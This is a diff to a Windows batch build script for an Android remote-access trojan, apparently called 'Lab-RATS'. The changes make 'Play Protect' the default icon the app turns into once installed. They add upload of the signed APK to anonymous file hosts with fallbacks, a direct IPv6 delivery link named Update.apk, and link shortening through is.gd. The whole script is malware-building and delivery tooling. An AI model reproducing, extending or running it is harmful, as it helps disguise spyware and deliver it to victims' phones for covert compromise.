@@ -2,7 +2,7 @@
 setlocal EnableDelayedExpansion
 chcp 65001 >nul 2>&1
 
-title Lab-RATS APK Builder v1.5.1 - by K4N3CO
+title Lab-RATS APK Builder v1.6.0 - by K4N3CO
 
 set "SCRIPT_DIR=%~dp0"
 set "PROJECT_DIR=%SCRIPT_DIR%.."
@@ -40,7 +40,7 @@ echo │     ██║     ██╔══██║██╔══██╗╚�
 echo │     ███████╗██║  ██║██████╔╝      ██║  ██║██║  ██║   ██║   ██████║    │
 echo │     ╚══════╝╚═╝  ╚═╝╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝    │
 echo │                                                                       │
-echo │     ----------> Android APK Builder | v1.5.1 Hardened <----------     │
+echo │     ----------> Android APK Builder | v1.6.0 Hardened <----------     │
 echo │                                                                       │
 echo │   The one's who MIND don't matter. The one's who MATTER don't mind.   │
 echo │                         DEVELOPED BY K4N3CO                           │
@@ -127,8 +127,8 @@ if "!MIN_SDK!"=="" set "MIN_SDK=21"
 echo.
 echo [*] Decoy Identity Selection
 echo     (The app logo will transform into your selection immediately after install on device)
-echo     1. System Update (Gear)  2. Calculator
-echo     3. Weather               4. Play Protect
+echo     1. Play Protect (Shield - Default)  2. Calculator
+echo     3. Weather                          4. System Update
 echo     5. Lab-RATS Logo
 set /p "DECOY_CHOICE=    Choice (Default 1): "
 if "!DECOY_CHOICE!"=="" set "DECOY_CHOICE=1"
@@ -180,7 +180,7 @@ goto :eof
 call :print_banner
 echo [*] Initializing Build Engine...
 cd /d "%PROJECT_DIR%"
-call gradlew.bat clean assembleRelease --no-daemon
+call gradlew.bat assembleRelease --parallel
 set "BUILD_STATUS=%errorlevel%"
 
 if not exist "%SCRIPT_DIR%output" mkdir "%SCRIPT_DIR%output"
@@ -291,28 +291,36 @@ if not exist "%SIGNED_APK%" (
 
 echo.
 echo [HOSTING] Select strategy:
-echo     1. Anonymous Cloud (Catbox)  2. Direct IP (IPv6)
+echo     1. Anonymous Cloud (Catbox / Multi-Cloud Fallback)
+echo     2. Direct IP (IPv6)
+echo     3. Custom / Pre-hosted Direct URL
 set /p "H=    Choice: "
 set "DOWNLOAD_URL="
 
 if "!H!"=="2" (
     set /p "IP=    Target IPv6: "
     set "DOWNLOAD_URL=http://[!IP!]:9191/download/Update.apk"
+) else if "!H!"=="3" (
+    set /p "DOWNLOAD_URL=    Enter pre-hosted URL: "
 ) else (
     echo [*] Uploading to Catbox.moe...
-    powershell -Command "$resp = curl.exe -sS -F 'reqtype=fileupload' -F 'fileToUpload=@%SIGNED_APK%' https://catbox.moe/user/api.php; Set-Content -Path '%SCRIPT_DIR%temp_url.txt' -Value $resp"
+    powershell -Command "$r = curl.exe -sS --connect-timeout 5 --max-time 15 -F 'reqtype=fileupload' -F 'fileToUpload=@%SIGNED_APK%' https://catbox.moe/user/api.php 2>$null; if ($r -notlike 'http*') { Write-Host '[!] Catbox failed/unreachable. Trying Litterbox fallback...' -ForegroundColor Yellow; $r = curl.exe -sS --connect-timeout 5 --max-time 15 -F 'reqtype=fileupload' -F 'time=72h' -F 'fileToUpload=@%SIGNED_APK%' https://litterbox.catbox.moe/resources/internals/api.php 2>$null }; if ($r -notlike 'http*') { Write-Host '[!] Litterbox failed. Trying Tmpfiles.org fallback...' -ForegroundColor Yellow; $j = curl.exe -sS --connect-timeout 5 --max-time 15 -F 'file=@%SIGNED_APK%' https://tmpfiles.org/api/v1/upload 2>$null; if ($j -match '\"url\":\"([^\"]+)\"') { $r = $matches[1] -replace 'tmpfiles.org/', 'tmpfiles.org/dl/' } }; Set-Content -Path '%SCRIPT_DIR%temp_url.txt' -Value $r"
     if exist "%SCRIPT_DIR%temp_url.txt" (
         set /p DOWNLOAD_URL=<%SCRIPT_DIR%temp_url.txt
         del "%SCRIPT_DIR%temp_url.txt"
     )
     if "!DOWNLOAD_URL!"=="" (
-        echo [!] Upload failed.
+        echo [!] Automated cloud uploads unreachable/failed on this network.
+        set /p "DOWNLOAD_URL=    Enter custom / pre-hosted URL manually: "
+    )
+    if "!DOWNLOAD_URL!"=="" (
+        echo [!] Upload failed / No valid URL provided.
         set /p "ENTER=Press Enter to return..."
         goto :eof
     )
     echo [✓] Hosted: !DOWNLOAD_URL!
     echo [*] Shortening delivery URL...
-    powershell -Command "$s = curl.exe -s 'https://is.gd/create.php?format=simple&url=!DOWNLOAD_URL!'; if ($s -like 'http*') { Set-Content -Path '%SCRIPT_DIR%temp_short.txt' -Value $s }"
+    powershell -Command "$s = curl.exe -s --connect-timeout 5 'https://is.gd/create.php?format=simple&url=!DOWNLOAD_URL!' 2>$null; if ($s -like 'http*') { Set-Content -Path '%SCRIPT_DIR%temp_short.txt' -Value $s }"
     if exist "%SCRIPT_DIR%temp_short.txt" (
         set /p SHORT_URL=<%SCRIPT_DIR%temp_short.txt
         del "%SCRIPT_DIR%temp_short.txt"
@@ -354,7 +362,7 @@ goto :eof
 
 :show_help
 call :print_banner
-echo COMMAND_DOCUMENTATION_V1.5.1
+echo COMMAND_DOCUMENTATION_V1.6.0
 echo ------------------------------------------------------------
 echo 1. Start Build: Standard production flow.
 echo 2. Keystore Only: Unique signing certificate.
